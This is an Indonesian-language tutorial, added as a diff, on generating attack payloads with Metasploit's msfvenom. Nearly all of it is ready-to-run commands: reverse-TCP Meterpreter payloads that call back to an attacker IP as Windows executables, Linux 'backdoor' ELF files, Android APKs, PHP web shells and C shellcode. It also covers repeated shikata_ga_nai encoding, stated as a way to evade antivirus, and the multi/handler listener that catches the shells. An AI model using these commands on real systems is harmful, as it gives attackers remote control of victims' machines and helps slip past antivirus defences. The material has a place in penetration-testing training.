@@ -1,0 +1,126 @@
+# Membuat Payload dengan msfvenom
+
+## Apa Itu msfvenom?
+
+msfvenom adalah tool bawaan dari Metasploit yang digunakan untuk:
+
+- Membuat payload eksploitasi (`reverse shell`, `Meterpreter`, `dll`)
+- Meng-encode payload untuk menghindari antivirus
+- Meng-output payload dalam berbagai format (`exe`, `elf`, `raw`, `c`, `dll`)
+
+## B. Struktur Dasar Perintah msfvenom
+
+```
+msfvenom -p <payload> LHOST=<ip_attacker> LPORT=<port> -f <format_output> -o <nama_file>
+```
+
+**Keterangan:**
+
+| Parameter | Fungsi |
+|:--:|:--:|
+| `-p` | Memilih jenis payload | 
+| `LHOST` | IP lokal/attacker |
+| `LPORT` |	Port listener di attacker |
+| `-f` | Format file output (`exe`, `elf`, `raw`, `dll`) |
+| `-o` | Nama file output |
+| `-e` | Encoder yang digunakan |
+| `-i` | Jumlah iterasi encoder |
+| `-n` | Jumlah byte NOP (NOP sled) |
+
+## C. Contoh Payload Windows
+
+### 1. Payload Reverse TCP
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+```
+
+Output: `shell.exe` (bisa dijalankan di sistem Windows)
+
+### 2. Payload Dilengkapi Encoder
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
+```
+
+Encoding `5 kali` untuk menghindari deteksi AV
+
+## D. Contoh Payload Linux
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o backdoor.elf
+```
+
+Output: file `ELF` untuk Linux
+
+## E. Format Output yang Didukung
+
+| Format |	Keterangan |
+|:--:|:--:|
+| `exe` | Windows executable |
+| `elf` |	Linux executable |
+| `raw` | Shellcode mentah |
+| `c`	| Shellcode dalam array C |
+| `python` | Shellcode untuk script Python |
+| `asp, jsp, php`	| Webshell payload |
+| `dll, macho, rb, dll`	| Format lainnya |
+
+## F. Menampilkan Semua Payload yang Tersedia
+
+```
+msfvenom -l payloads
+```
+
+## G. Contoh Payload di Format C
+
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
+```
+
+Output-nya cocok untuk disisipkan dalam exploit `C` manual.
+
+## H. Membuat Web Payload (PHP/ASP/JSP)
+Contoh Payload PHP:
+
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
+```
+
+## I. Memasukkan Bad Characters
+
+Untuk menghindari karakter tertentu seperti `\x00\x0a`, bisa tambahkan:
+
+```
+-b "\x00\x0a"
+```
+
+**Contoh:**
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a" -f exe -o filtered_shell.exe
+```
+
+## J. Payload untuk Android
+
+```
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk
+```
+
+## K. Listener di Metasploit
+
+Setelah payload dijalankan di target, buka listener:
+
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run
+```
+
+## Tips Tambahan
+
+- Selalu uji payload di lab virtual.
+- Gunakan encoding bila antivirus mendeteksi payload.
+- Tambahkan `NOP sled` jika payload tidak stabil.
